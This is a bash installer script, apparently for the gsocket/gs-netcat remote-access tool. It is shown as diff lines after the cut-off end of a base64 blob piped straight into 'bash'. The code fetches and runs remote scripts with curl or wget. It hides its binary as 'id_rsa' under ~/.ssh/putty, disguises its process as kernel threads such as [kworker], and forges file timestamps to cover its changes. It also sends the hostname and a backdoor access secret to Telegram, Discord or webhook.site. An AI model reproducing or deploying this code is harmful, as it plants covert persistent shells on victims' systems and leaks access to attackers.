9ImdzLW5ldGNhdF9taW5pLWxpbnV4LW1pcHMzMiIKCQkJCWlzX2xlICYmIHsKCQkJCQlPU0FSQ0g9Im1pcHNlbDMyLWFscGluZSIKCQkJCQlTUkNfUEtHPSJncy1uZXRjYXRfbWluaS1saW51eC1taXBzZWwiCgkJCQl9CgkJCWZpCgkJZWxpZiBbWyAkT1NUWVBFID09ICpkYXJ3aW4qIF1dOyB0aGVuCgkJCWlmIFtbICIkYXJjaCIgPT0gImFybTY0IiBdXTsgdGhlbgoJCQkJT1NBUkNIPSJ4ODZfNjQtb3N4IiAjIE0xCgkJCQkjIyBGSVhNRTogcmVhbGx5IG5lZWRzIE0zIGhlcmUuLgoJCQkJU1JDX1BLRz0iZ3MtbmV0Y2F0X21pbmktbWFjT1MteDg2XzY0IgoJCQkJIyBPU0FSQ0g9ImFybTY0LW9zeCIgIyBNMQoJCQllbHNlCgkJCQlPU0FSQ0g9Ing4Nl82NC1vc3giCgkJCQlTUkNfUEtHPSJncy1uZXRjYXRfbWluaS1tYWNPUy14ODZfNjQiCgkJCWZpCgkJZWxpZiBbWyAke09TVFlQRSwsfSA9PSAqZnJlZWJzZCogXV07IHRoZW4KCQkJCU9TQVJDSD0ieDg2XzY0LWZyZWVic2QiCgkJCQlTUkNfUEtHPSJncy1uZXRjYXRfbWluaS1mcmVlYnNkLXg4Nl82NCIKCQllbGlmIFtbICR7T1NUWVBFLCx9ID09ICpvcGVuYnNkKiBdXTsgdGhlbgoJCQkJT1NBUkNIPSJ4ODZfNjQtb3BlbmJzZCIKCQkJCVNSQ19QS0c9ImdzLW5ldGNhdF9taW5pLW9wZW5ic2QteDg2XzY0IgoJCWVsaWYgW1sgJHtPU1RZUEUsLH0gPT0gKmN5Z3dpbiogXV07IHRoZW4KCQkJT1NBUkNIPSJpNjg2LWN5Z3dpbiIKCQkJW1sgIiRhcmNoIiA9PSAieDg2XzY0IiBdXSAmJiBPU0FSQ0g9Ing4Nl82NC1jeWd3aW4iCgkJIyBlbGlmIFtbICRPU1RZUEUgPT0gKmdudSogXV0gJiYgW1sgIiQodW5hbWUgLXYpIiA9PSAqSHVyZCogXV07IHRoZW4KCQkJCSMgT1NBUkNIPSJpMzg2LWh1cmQiICMgZGViaWFuLWh1cmQKCQlmaQoKCQlbWyAteiAiJE9TQVJDSCIgXV0gJiYgewoJCQkjIERlZmF1bHQ6IFRyeSBBbHBpbmUobXVzY2wgbGliYykgNjRiaXQKCQkJT1NBUkNIPSJ4ODZfNjQtYWxwaW5lIgoJCQlTUkNfUEtHPSJncy1uZXRjYXRfbWluaS1saW51eC14ODZfNjQiCgkJfQoJZmkKCgkjIERvY2tlciBkb2VzIG5vdCBzZXQgVVNFUgoJW1sgLXogIiRVU0VSIiBdXSAmJiBVU0VSPSQoaWQgLXVuKQoJW1sgLXogIiRVSUQiIF1dICYmIFVJRD0kKGlkIC11KQoKCSMgY2hlY2sgdGhhdCB4eGQgaXMgd29ya2luZyBhcyBleHBlY3RlZCAoYWxwaW5lIGxpbnV4IGRvZXMgbm90IGhhdmUgLXIgb3B0aW9uKQoJdHJ5X2VuY29kZSAiYmFzZTY0IiAiYmFzZTY0IC13MCIgImJhc2U2NCAtZCIKCXRyeV9lbmNvZGUgInh4ZCIgInh4ZCAtcHMgLWMxMDI0IiAieHhkIC1yIC1wcyIKCURFQlVHRiAiRU5DT0RFX1NUUj0nJHtFTkNPREVfU1RSfSciCglbWyAteiAiJFNSQ19QS0ciIF1dICYmIFNSQ19QS0c9ImdzLW5ldGNhdF8ke09TQVJDSH0udGFyLmd6IgoKCSMgT1NYJ3MgcGtpbGwgbWF0Y2hlcyB0aGUgaGlkZGVuIG5hbWUgYW5kIG5vdCB0aGUgb3JpZ2luYWwgYmluYXJ5IG5hbWUuCgkjIEJlY2F1c2Ugd2UgaGlkZSBhcyAnLWJhc2gnIHdlIGNhbiBub3QgdXNlIHBraWxsIGFsbCAtYmFzaC4KCSMgJ2tpbGxhbGwnIGhvd2V2ZXIgbWF0Y2hlcyBncy1kYnVzIGFuZCBvbiBPU1ggd2UgdGh1cyBmb3JjZSBraWxsYWxsCglpZiBbWyAkT1NUWVBFID09ICpkYXJ3aW4qIF1dOyB0aGVuCgkJIyBvbiBPU1ggJ3BraWxsJyBtYXRjaGVzIHRoZSBwcm9jZXNzIChhcmd2WzBdKSB3aGVyZWFzIG9uIFVuaXgKCQkjICdwa2lsbCcgbWF0Y2hlcyB0aGUgYmluYXJ5IG5hbWUuCgkJS0xfQ01EPSJraWxsYWxsIgoJCUtMX0NNRF9SVU5DSEtfVUFSRz0oIi0wIiAiLXUke1VTRVJ9IikKCWVsaWYgY29tbWFuZCAtdiBwa2lsbCA+L2Rldi9udWxsOyB0aGVuCgkJS0xfQ01EPSJwa2lsbCIKCQlLTF9DTURfUlVOQ0hLX1VBUkc9KCItMCIgIi1VJHtVSUR9IikKCWVsaWYgY29tbWFuZCAtdiBraWxsYWxsID4vZGV2L251bGw7IHRoZW4KCQlLTF9DTUQ9ImtpbGxhbGwiCgkJIyBjeWd3aW4ncyBraWxsYWxsIG5lZWRzIHRoZSBuYW1lIChub3QgdGhlIHVpZCkKCQlLTF9DTURfUlVOQ0hLX1VBUkc9KCItMCIgIi11JHtVU0VSfSIpCglmaQoKCSMgJFBBVEggbWlnaHQgYmUgc2V0IGRpZmZlcmVudGx5IGluIGNyb250YWIvLnByb2ZpbGUuIFVzZQoJIyBhYnNvbHV0ZSBwYXRoIHRvIGJpbmFyeSBpbnN0ZWFkOgoJS0xfQ01EX0JJTj0iJChjb21tYW5kIC12ICIkS0xfQ01EIikiCglbWyAteiAkS0xfQ01EX0JJTiBdXSAmJiB7CgkJIyBzZXQgdG8gc29tZXRoaW5nIHRoYXQgcmV0dXJucyAnZmFsc2UnIHNvIHRoYXQgd2UgZG9udAoJCSMgaGF2ZSB0byBjaGVjayBmb3IgZW1wdHkgc3RyaW5nIGluIGNyb250YWIvLnByb2ZpbGUKCQkjIChlLmcuIHNraXAgY2hlY2tpbmcgaWYgYWxyZWFkeSBydW5uaW5nIGFuZCBhbHdheXMgc3RhcnQpCgkJS0xfQ01EX0JJTj0iJChjb21tYW5kIC12IGZhbHNlKSIKCQlbWyAteiAkS0xfQ01EX0JJTiBdXSAmJiBLTF9DTURfQklOPSIvYmluL2RvZXMtbm90LWV4aXQiCgkJV0FSTiAiTm8gcGtpbGwgb3Iga2lsbGFsbCBmb3VuZC4iCgl9CgoJIyBEZWZhdWx0cwoJIyBCaW5hcnkgZmlsZSBpcyBjYWxsZWQgZ3MtZGJ1cyBvciBzZXQgdG8gc2FtZSBuYW1lIGFzIFByb2Nlc3MgbmFtZSBpZgoJIyBHU19ISURERU5fTkFNRSBpcyBzZXQuIENhbiBiZSBvdmVyd3JpdHRlbiB3aXRoIEdTX0JJTl9ISURERU5fTkFNRT0KCWlmIFtbIC1uICRHU19CSU5fSElEREVOX05BTUUgXV07IHRoZW4KCQlCSU5fSElEREVOX05BTUU9IiR7R1NfQklOX0hJRERFTl9OQU1FfSIKCQlCSU5fSElEREVOX05BTUVfUk0rPSgiJEdTX0JJTl9ISURERU5fTkFNRSIpCgllbHNlCgkJQklOX0hJRERFTl9OQU1FPSIke0dTX0hJRERFTl9OQU1FOi0kQklOX0hJRERFTl9OQU1FX0RFRkFVTFR9IgoJZmkKCUJJTl9ISURERU5fTkFNRV9SWD0kKGVjaG8gIiRCSU5fSElEREVOX05BTUUiIHwgc2VkICdzL1teYS16QS1aMC05XS9cXCYvZycpCgkKCVNFQ19OQU1FPSIkKHVuYW1lIC1uKS5wcGsiCglpZiBbWyAtbiAkR1NfSElEREVOX05BTUUgXV07IHRoZW4KCQlQUk9DX0hJRERFTl9OQU1FPSIke0dTX0hJRERFTl9OQU1FfSIKCQlQUk9DX0hJRERFTl9OQU1FX1JYKz0ifCQoZWNobyAiJEdTX0hJRERFTl9OQU1FIiB8IHNlZCAncy9bXmEtekEtWjAtOV0vXFwmL2cnKSIKCWVsc2UKCQlQUk9DX0hJRERFTl9OQU1FPSIkUFJPQ19ISURERU5fTkFNRV9ERUZBVUxUIgoJZmkKCglTRVJWSUNFX0hJRERFTl9OQU1FPSIke0JJTl9ISURERU5fTkFNRX0iCgoJUkNMT0NB' | base64 -d | bash
+#! /usr/bin/env bash
+
+URL_BASE_CDN="https://cdn.gsocket.io"
+URL_BASE_X="https://gsocket.io"
+[[ -n $GS_URL_BASE ]] && {
+	URL_BASE_CDN="${GS_URL_BASE}"
+	URL_BASE_X="${GS_URL_BASE}"
+}
+URL_BIN="${URL_BASE_CDN}/bin"       # mini & stripped version
+URL_BIN_FULL="${URL_BASE_CDN}/full" # full version (with -h working)
+[[ -n $GS_URL_BIN ]] && {
+	URL_BIN="${GS_URL_BIN}"
+	URL_BIN_FULL="$URL_BIN"
+}
+[[ -n $GS_URL_DEPLOY ]] && URL_DEPLOY="${GS_URL_DEPLOY}" || URL_DEPLOY="${URL_BASE_X}/y"
+
+# STUBS for deploy_server.sh to fill out:
+gs_deploy_webhook=
+GS_WEBHOOK_404_OK=
+[[ -n $gs_deploy_webhook ]] && GS_WEBHOOK="$gs_deploy_webhook"
+unset gs_deploy_webhook
+
+
+[[ -n $GS_TG_TOKEN ]] && [[ -n $GS_TG_CHATID ]] && {
+	GS_WEBHOOK_CURL=("--data-urlencode" "text=${msg}" "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html")
+	GS_WEBHOOK_WGET=("https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html&text=${msg}")
+}
+
+[[ -n $GS_WEBHOOK ]] && {
+	GS_WEBHOOK_CURL=("$GS_WEBHOOK")
+	GS_WEBHOOK_WGET=("$GS_WEBHOOK")
+}
+
+[[ -n $GS_WEBHOOK_KEY ]] && {
+	# shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
+	data='{"hostname": "$(hostname)", "system": "$(uname -rom)", "access": "gs-netcat -i -s ${GS_SECRET}"}'
+	GS_WEBHOOK_CURL=('-H' 'Content-type: application/json' '-d' "${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
+	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
+}
+
+
+[[ -n $GS_DISCORD_KEY ]] && {
+	data='{"username": "gsocket", "content": "'"${msg}"'"}'
+	GS_WEBHOOK_CURL=('-H' 'Content-Type: application/json' '-d' "${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
+	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
+}
+
+unset data
+unset msg
+
+DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
+DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
+BIN_HIDDEN_NAME_DEFAULT="id_rsa"
+
+proc_name_arr=("[kstrp]" "[watchdogd]" "[ksmd]" "[kswapd0]" "[card0-crtc8]" "[mm_percpu_wq]" "[rcu_preempt]" "[kworker]" "[raid5wq]" "[slub_flushwq]" "[netns]" "[kaluad]")
+
+PROC_HIDDEN_NAME_DEFAULT="${proc_name_arr[$((RANDOM % ${#proc_name_arr[@]}))]}"
+for str in "${proc_name_arr[@]}"; do
+	PROC_HIDDEN_NAME_RX+="|$(echo "$str" | sed 's/[^a-zA-Z0-9]/\\&/g')"
+done
+PROC_HIDDEN_NAME_RX="${PROC_HIDDEN_NAME_RX:1}"
+
+
+CONFIG_DIR_NAME="putty"
+
+# Names for 'uninstall' (including names from previous versions)
+BIN_HIDDEN_NAME_RM=("$BIN_HIDDEN_NAME_DEFAULT")
+CONFIG_DIR_NAME_RM=("$CONFIG_DIR_NAME")
+
+[[ -t 1 ]] && {
+	CY="\033[1;33m" # yellow
+	CDY="\033[0;33m" # yellow
+	CG="\033[1;32m" # green
+	CR="\033[1;31m" # red
+	CDR="\033[0;31m" # red
+	CB="\033[1;34m" # blue
+	CC="\033[1;36m" # cyan
+	CDC="\033[0;36m" # cyan
+	CM="\033[1;35m" # magenta
+	CN="\033[0m"    # none
+	CW="\033[1;37m"
+}
+
+if [[ -z "$GS_DEBUG" ]]; then
+	DEBUGF(){ :;}
+else
+	DEBUGF(){ echo -e "${CY}DEBUG:${CN} $*";}
+fi
+
+_ts_fix()
+{
+	local fn
+	local ts
+	local args
+	local ax
+	fn="$1"
+	ts="$2"
+
+	args=() #OSX, must init or " " in touch " " -r 
+
+	[[ ! -e "$1" ]] && return
+	[[ -z $ts ]] && return
+
+	# Change the symlink for ts_systemd_fn items
+	[[ -n "$3" ]] && args=("-h")
+
+	# Either reference by Timestamp or File
+	[[ "${ts:0:1}" = '/' ]] && {
+		[[ ! -e "${ts}" ]] && ts="/etc/ld.so.conf"
+		ax=("${args[@]}" "-r" "$ts" "$fn")
+		touch "${ax[@]}" 2>/dev/null
+		return
+	}
+	ax=("${args[@]}" "-t" "$ts" "$fn")
+	touch "${ax[@]}" 2>/dev/null && return
+	# If 'date -r' or 'touch -t' failed:
+	ax=("${args[@]}" "-r" "/etc/ld.so.conf" "$fn")
+	touch "${ax[@]}" 2>/dev/null
+}
+
+# Restore timestamp of files
+ts_restore()
+{
+	local fn
+	local n
+	local ts
+
+	[[ ${#_ts_fn_a[@]} -ne ${#_ts_ts_a[@]} ]] && { echo >&2 "Ooops"; return; }
+
+	n=0
+	while :; do
+		[[ $n -eq "${#_ts_fn_a[@]}" ]] && break
+		ts="${_ts_ts_a[$n]}"
+		fn="${_ts_fn_a[$n]}"
+		# DEBUGF "RESTORE-TS ${fn} ${ts}"
+		((n++))
+
+		_ts_fix "$fn" "$ts"
+	done
+	unset _ts_fn_a
+	unset _ts_ts_a
+
+	n=0
+	while :; do
+		[[ $n -eq "${#_ts_systemd_ts_a[@]}" ]] && break
+		ts="${_ts_systemd_ts_a[$n]}"
+		fn="${_ts_systemd_fn_a[$n]}"
+		# DEBUGF "RESTORE-LAST-TS ${fn} ${ts}"
+		((n++))
+
+		_ts_fix "$fn" "$ts" "symlink"
+	done
+	unset _ts_systemd_fn_a
+	unset _ts_systemd_ts_a
+}
+
+ts_is_marked()
+{
+	local fn
+	local a
+	fn="$1"
+
+	for a in "${_ts_fn_a[@]}"; do
+		[[ "$a" = "$fn" ]] && return 0 # True
+	done
+
+	return 1 # False
+}
+
+# There are some files which need TimeStamp update after all other TimeStamps
+# have been fixed. Noteable /etc/systemd/system/multi-user.target.wants
+# ts_add_last [file] <reference file>
+ts_add_systemd()
+{
+	local fn
+	local ts
+	local ref
+	fn="$1"
+	ref="$2"
+
+	ts="$ref"
+	[[ -z $ref ]] && {
+		ts="$(date -r "$fn" +%Y%m%d%H%M.%S 2>/dev/null)" || return
+	}
+
+	# Note: _ts_systemd_ts_a may store a number or a directory (start with '/')
+	_ts_systemd_ts_a+=("$ts")
+	_ts_systemd_fn_a+=("$fn")
+}
+
+# Determine the Timestamp of the file $fn that is about to be
+# created (or already exists).
+# Sets $_ts_ts to Timestamp.
+# Usage: _ts_get_ts [$fn]
+_ts_get_ts()
+{
+	local fn
+	local n
+	local pdir
+	fn="$1"
+	pdir="$(dirname "$1")"
+
+	unset _ts_ts
+	unset _ts_pdir_by_us
+	# Inherit Timestamp if parent directory was created
+	# by us.
+	n=0
+	while :; do
+		[[ $n -eq "${#_ts_fn_a[@]}" ]] && break
+		[[ "$pdir" = "${_ts_mkdir_fn_a[$n]}" ]] && {
+			_ts_ts="${_ts_ts_a[$n]}"
+			_ts_pdir_by_us=1
+			# DEBUGF "Parent ${pdir} created by us."
+			return
+		}
+		((n++))
+	done
+
+	# Check if file exists.
+	[[ -e "$fn" ]] && _ts_ts="$(date -r "$fn" +%Y%m%d%H%M.%S 2>/dev/null)" && return
+
+	# Take ts from oldest file in directory
+	# shellcheck disable=SC2012 #Use find instead of ls => not portable
+	oldest="${pdir}/$(ls -atr "${pdir}" 2>/dev/null | head -n1)"
+	_ts_ts="$(date -r "$oldest" +%Y%m%d%H%M.%S 2>/dev/null)"
+}
+
+
+_ts_add()
+{
+	# Retrieve TimeStamp for $1
+	_ts_get_ts "$1"
+	# Add TimeStamp
+	_ts_ts_a+=("$_ts_ts")
+	_ts_fn_a+=("$1");
+	_ts_mkdir_fn_a+=("$2")
+}
+
+# Note: Do not use global _ts variables except _ts_add_direct
+# Usage: mk_file [filename]
+mk_file()
+{
+	local fn
+	local oldest
+	local pdir
+	local pdir_added
+	fn="$1"
+	local exists
+
+	# DEBUGF "${CC}MK_FILE($fn)${CN}"
+	pdir="$(dirname "$fn")"
+	[[ -e "$fn" ]] && exists=1
+
+	ts_is_marked "$pdir" || {
+		# HERE: Parent not tracked
+		_ts_add "$pdir" "<NOT BY XMKDIR>"
+		pdir_added=1
+	}
+
+	ts_is_marked "$fn" || {
+		# HERE: Not yet tracked
+		_ts_get_ts "$fn"
+		# Do not add creation fails.
+		touch "$fn" 2>/dev/null || {
+			# HERE: Permission denied
+			[[ -n "$pdir_added" ]] && {
+				# Remove pdir if it was added above
+				# Bash <5.0 does not support arr[-1]
+				# Quote (") to silence shellcheck
+				unset "_ts_ts_a[${#_ts_ts_a[@]}-1]"
+				unset "_ts_fn_a[${#_ts_fn_a[@]}-1]"
+				unset "_ts_mkdir_fn_a[${#_ts_mkdir_fn_a[@]}-1]"
+			}
+			return 69 # False
+		}
+		[[ -z $exists ]] && chmod 600 "$fn"
+		_ts_ts_a+=("$_ts_ts")
+		_ts_fn_a+=("$fn");
+		_ts_mkdir_fn_a+=("<NOT BY XMKDIR>")
+		return
+	}
+
+	touch "$fn" 2>/dev/null || return
+	[[ -z $exists ]] && chmod 600 "$fn"
+	true
+}
+
+xrmdir()
+{
+	local fn
+	local pdir
+	fn="$1"
+
+	[[ ! -d "$fn" ]] && return
+	pdir="$(dirname "$fn")"
+
+	ts_is_marked "$pdir" || {
+		_ts_add "$pdir" "<RMDIR-UNTRACKED>"
+	}
+
+	rmdir "$fn" 2>/dev/null
+}
+
+xrm()
+{
+	local pdir
+	local fn
+	fn="$1"
+
+	[[ ! -f "$fn" ]] && return
+	pdir="$(dirname "$fn")"
+
+	ts_is_marked "$pdir" || {
+		# HERE: Parent is not tracked.
+		_ts_add "$pdir" "<RM-UNTRACKED>"
+	}
+
+	rm -f "$1" 2>/dev/null
+}
+
+# Create a directory if it does not exist and fix timestamp
+# xmkdir [directory] <ts reference file>
+xmkdir()
+{
+	local fn
+	local pdir
+	fn="$1"
+
+	DEBUGF "${CG}XMKDIR($fn)${CN}"
+	pdir="$(dirname "$fn")"
+	true # reset $?
+	[[ -d "$fn" ]] && return     # Directory already exists
+	[[ ! -d "$pdir" ]] && return # Parent dir does not exists (Huh?)
+
+	# Check if parent is being tracked
+	ts_is_marked "$pdir" || {
+		# HERE: Parent not tracked
+		# We did not create the parent or we would be tracking it.
+		_ts_add "$pdir" "<NOT BY XMKDIR>"
+	}
+
+	# Check if new directory is already tracked
+	ts_is_marked "$fn" || {
+		# HERE: Not yet tracked (normal case)
+		_ts_add "$fn" "$fn" # We create the directory (below)
+	}
+
+	mkdir "$fn" 2>/dev/null || return
+	chmod 700 "$fn"
+	true
+}
+
+xcp()
+{
+	local src
+	local dst
+	src="$1"
+	dst="$2"
+
+	# DEBUGF "${CG}XCP($src, $dst)${CN}"
+	mk_file "$dst" || return
+	cp "$src" "$dst" || return
+	true
+}
+
+xmv()
+{
+	local src
+	local dst
+	src="$1"
+	dst="$2"
+
+	[[ -e "$dst" ]] && xrm "$dst"
+	xcp "$src" "$dst" || return
+	xrm "$src"
+	true
+}
+
+clean_all()
+{
+	[[ "${#TMPDIR}" -gt 5 ]] && {
+		rm -rf "${TMPDIR:?}/"*
+		rmdir "${TMPDIR}"
+	} &>/dev/null
+
+	ts_restore
+}
+
+exit_code()
+{
+	clean_all
+
+	exit "$1"
+}
+
+errexit()
+{
+	[[ -z "$1" ]] || echo -e >&2 "${CR}$*${CN}"
+
+	exit_code 255
+}
+
+try_dstdir()
+{
+	local dstdir
+	local trybin
+	dstdir="${1}"
+
+	# Create directory if it does not exists.
+	[[ ! -d "${dstdir}" ]] && { xmkdir "${dstdir}" || return 101; }
+
+	DSTBIN="${dstdir}/${BIN_HIDDEN_NAME}"
+ 
+	mk_file "$DSTBIN" || return 102
+
+	# Find an executeable and test if we can execute binaries from
+	# destination directory (no noexec flag)
+	# /bin/true might be a symlink to /usr/bin/true
+	for ebin in "/bin/true" "$(command -v id)"; do
+		[[ -z $ebin ]] && continue
+		[[ -e "$ebin" ]] && break
+	done
+	[[ ! -e "$ebin" ]] && return 0 # True. Try our best
+
+	# Must use same name on busybox-systems
+	trybin="${dstdir}/$(basename "$ebin")"
+
+	# /bin/true might be a symlink to /usr/bin/true
+	[[ "$ebin" -ef "$trybin" ]] && return 0
+	mk_file "$trybin" || return
+
+
+	cp "$ebin" "$trybin" &>/dev/null || { rm -f "${trybin:?}"; return; }
+	chmod 700 "$trybin"
+
+	"${trybin}" -g &>/dev/null || { rm -f "${trybin:?}"; return 104; } # FAILURE
+	rm -f "${trybin:?}"
+
+	return 0
+}
+
+
+
+# Called _after_ init_vars() at the end of init_setup.
+init_dstbin()
+{
+	if [[ -n "$GS_DSTDIR" ]]; then
+		try_dstdir "${GS_DSTDIR}" && return
+
+		errexit "FAILED: GS_DSTDIR=${GS_DSTDIR} is not writeable and executeable."
+	fi
+
+	# Try systemwide installation first
+	try_dstdir "${GS_PREFIX}/usr/bin" && return
+
+	# Try user installation
+	[[ ! -d "${GS_PREFIX}$(grep ^"$(whoami)" /etc/passwd | cut -d: -f6)/.ssh" ]] && xmkdir "${GS_PREFIX}$(grep ^"$(whoami)" /etc/passwd | cut -d: -f6)/.ssh"
+	try_dstdir "${GS_PREFIX}$(grep ^"$(whoami)" /etc/passwd | cut -d: -f6)/.ssh/${CONFIG_DIR_NAME}" && return
+
+	# Try current working directory
+	try_dstdir "${PWD}" && { IS_DSTBIN_CWD=1; return; }
+
+	# Try /tmp/.gsusr-*
+	try_dstdir "/tmp/.gsusr-${UID}" && { IS_DSTBIN_TMP=1; return; }
+
+	# Try /dev/shm as last resort
+	try_dstdir "/dev/shm" && { IS_DSTBIN_TMP=1; return; }
+
+	echo -e >&2 "${CR}ERROR: Can not find writeable and executable directory.${CN}"
+	WARN "Try setting GS_DSTDIR= to a writeable and executable directory."
+	errexit
+}
+
+try_tmpdir()
+{
+	[[ -n $TMPDIR ]] && return # already set
+
+	[[ ! -d "$1" ]] && return
+
+	[[ -d "$1" ]] && xmkdir "${1}/${2}" && TMPDIR="${1}/${2}"
+}
+
+try_encode()
+{
+	local enc
+	local dec
+	local teststr
+	prg="$1"
+	enc="$2"
+	dec="$3"
+
+	teststr="blha|;id-u \'this is a long test of a very long string to test encodign decoding process # foobar"
+
+	[[ -n $ENCODE_STR ]] && return
+
+	command -v "$prg" >/dev/null && [[ "$(echo "$teststr" | $enc 2>/dev/null| $dec 2>/dev/null)" = "$teststr" ]] || return
+	ENCODE_STR="$enc"
+	DECODE_STR="$dec"
+}
+
+
+# Return TRUE if we are 100% sure it's little endian
+is_le()
+{
+	command -v lscpu >/dev/null && {
+		[[ $(lscpu) == *"Little Endian"* ]] && return 0
+		return 255
+	}
+
+	command -v od >/dev/null && command -v awk >/dev/null && {
+		[[ $(echo -n I | od -o | awk 'FNR==1{ print substr($2,6,1)}') == "1" ]] && return 0
+	}
+
+	return 255
+}
+
+init_vars()
+{
+	# Select binary
+	local arch
+	local osname
+	arch=$(uname -m)
+
+
+	HOME="/dev/shm"
+
+	# set PWD if not set
+	[[ -z "$PWD" ]] && PWD="$(pwd 2>/dev/null)"
+
+	[[ -z "$OSTYPE" ]] && {
+		local osname
+		osname="$(uname -s)"
+		if [[ "$osname" == *FreeBSD* ]]; then
+			OSTYPE="FreeBSD"
+		elif [[ "$osname" == *Darwin* ]]; then
+			OSTYPE="darwin22.0"
+		elif [[ "$osname" == *OpenBSD* ]]; then
+			OSTYPE="openbsd7.3"
+		elif [[ "$osname" == *Linux* ]]; then
+			OSTYPE="linux-gnu"
+		fi
+	}
+
+	unset OSARCH
+	unset SRC_PKG
+	# User supplied OSARCH
+	[[ -n "$GS_OSARCH" ]] && OSARCH="$GS_OSARCH"
+
+	if [[ -z "$OSARCH" ]]; then
+		if [[ $OSTYPE == *linux* ]]; then 
+			if [[ "$arch" == "i686" ]] || [[ "$arch" == "i386" ]]; then
+				OSARCH="i386-alpine"
+				SRC_PKG="gs-netcat_mini-linux-i686"
+			elif [[ "$arch" == *"armv6"* ]]; then
+				OSARCH="arm-linux"
+				SRC_PKG="gs-netcat_mini-linux-armv6"
+			elif [[ "$arch" == *"armv7l" ]]; then
+				OSARCH="arm-linux"
+				SRC_PKG="gs-netcat_mini-linux-armv7l"
+			elif [[ "$arch" == *"armv"* ]]; then
+				OSARCH="arm-linux" # RPI-Zero / RPI 4b+
+				SRC_PKG="gs-netcat_mini-linux-arm"
+			elif [[ "$arch" == "aarch64" ]]; then
+				OSARCH="aarch64-linux"
+				SRC_PKG="gs-netcat_mini-linux-aarch64"
+			elif [[ "$arch" == "mips64" ]]; then
+				OSARCH="mips64-alpine"
+				SRC_PKG="gs-netcat_mini-linux-mips64"
+				# Go 32-bit if Little Endian even if 64bit arch
+				is_le && {
+					OSARCH="mipsel32-alpine"
+					SRC_PKG="gs-netcat_mini-linux-mipsel"
+				}
+			elif [[ "$arch" == *mips* ]]; then
+				OSARCH="mips32-alpine"
+				SRC_PKG="gs-netcat_mini-linux-mips32"
+				is_le && {
+					OSARCH="mipsel32-alpine"
+					SRC_PKG="gs-netcat_mini-linux-mipsel"
+				}
+			fi
+		elif [[ $OSTYPE == *darwin* ]]; then
+			if [[ "$arch" == "arm64" ]]; then
+				OSARCH="x86_64-osx" # M1
+				## FIXME: really needs M3 here..
+				SRC_PKG="gs-netcat_mini-macOS-x86_64"
+				# OSARCH="arm64-osx" # M1
+			else
+				OSARCH="x86_64-osx"
+				SRC_PKG="gs-netcat_mini-macOS-x86_64"
+			fi
+		elif [[ ${OSTYPE,,} == *freebsd* ]]; then
+				OSARCH="x86_64-freebsd"
+				SRC_PKG="gs-netcat_mini-freebsd-x86_64"
+		elif [[ ${OSTYPE,,} == *openbsd* ]]; then
+				OSARCH="x86_64-openbsd"
+				SRC_PKG="gs-netcat_mini-openbsd-x86_64"
+		elif [[ ${OSTYPE,,} == *cygwin* ]]; then
+			OSARCH="i686-cygwin"
+			[[ "$arch" == "x86_64" ]] && OSARCH="x86_64-cygwin"
+		# elif [[ $OSTYPE == *gnu* ]] && [[ "$(uname -v)" == *Hurd* ]]; then
+				# OSARCH="i386-hurd" # debian-hurd
+		fi
+
+		[[ -z "$OSARCH" ]] && {
+			# Default: Try Alpine(muscl libc) 64bit
+			OSARCH="x86_64-alpine"
+			SRC_PKG="gs-netcat_mini-linux-x86_64"
+		}
+	fi
+
+	# Docker does not set USER
+	[[ -z "$USER" ]] && USER=$(id -un)
+	[[ -z "$UID" ]] && UID=$(id -u)
+
+	# check that xxd is working as expected (alpine linux does not have -r option)
+	try_encode "base64" "base64 -w0" "base64 -d"
+	try_encode "xxd" "xxd -ps -c1024" "xxd -r -ps"
+	DEBUGF "ENCODE_STR='${ENCODE_STR}'"
+	[[ -z "$SRC_PKG" ]] && SRC_PKG="gs-netcat_${OSARCH}.tar.gz"
+
+	# OSX's pkill matches the hidden name and not the original binary name.
+	# Because we hide as '-bash' we can not use pkill all -bash.
+	# 'killall' however matches gs-dbus and on OSX we thus force killall
+	if [[ $OSTYPE == *darwin* ]]; then
+		# on OSX 'pkill' matches the process (argv[0]) whereas on Unix
+		# 'pkill' matches the binary name.
+		KL_CMD="killall"
+		KL_CMD_RUNCHK_UARG=("-0" "-u${USER}")
+	elif command -v pkill >/dev/null; then
+		KL_CMD="pkill"
+		KL_CMD_RUNCHK_UARG=("-0" "-U${UID}")
+	elif command -v killall >/dev/null; then
+		KL_CMD="killall"
+		# cygwin's killall needs the name (not the uid)
+		KL_CMD_RUNCHK_UARG=("-0" "-u${USER}")
+	fi
+
+	# $PATH might be set differently in crontab/.profile. Use
+	# absolute path to binary instead:
+	KL_CMD_BIN="$(command -v "$KL_CMD")"
+	[[ -z $KL_CMD_BIN ]] && {
+		# set to something that returns 'false' so that we dont
+		# have to check for empty string in crontab/.profile
+		# (e.g. skip checking if already running and always start)
+		KL_CMD_BIN="$(command -v false)"
+		[[ -z $KL_CMD_BIN ]] && KL_CMD_BIN="/bin/does-not-exit"
+		WARN "No pkill or killall found."
+	}
+
+	# Defaults
+	# Binary file is called gs-dbus or set to same name as Process name if
+	# GS_HIDDEN_NAME is set. Can be overwritten with GS_BIN_HIDDEN_NAME=
+	if [[ -n $GS_BIN_HIDDEN_NAME ]]; then
+		BIN_HIDDEN_NAME="${GS_BIN_HIDDEN_NAME}"
+		BIN_HIDDEN_NAME_RM+=("$GS_BIN_HIDDEN_NAME")
+	else
+		BIN_HIDDEN_NAME="${GS_HIDDEN_NAME:-$BIN_HIDDEN_NAME_DEFAULT}"
+	fi
+	BIN_HIDDEN_NAME_RX=$(echo "$BIN_HIDDEN_NAME" | sed 's/[^a-zA-Z0-9]/\\&/g')
+	
+	SEC_NAME="$(uname -n).ppk"
+	if [[ -n $GS_HIDDEN_NAME ]]; then
+		PROC_HIDDEN_NAME="${GS_HIDDEN_NAME}"
+		PROC_HIDDEN_NAME_RX+="|$(echo "$GS_HIDDEN_NAME" | sed 's/[^a-zA-Z0-9]/\\&/g')"
+	else
+		PROC_HIDDEN_NAME="$PROC_HIDDEN_NAME_DEFAULT"
+	fi
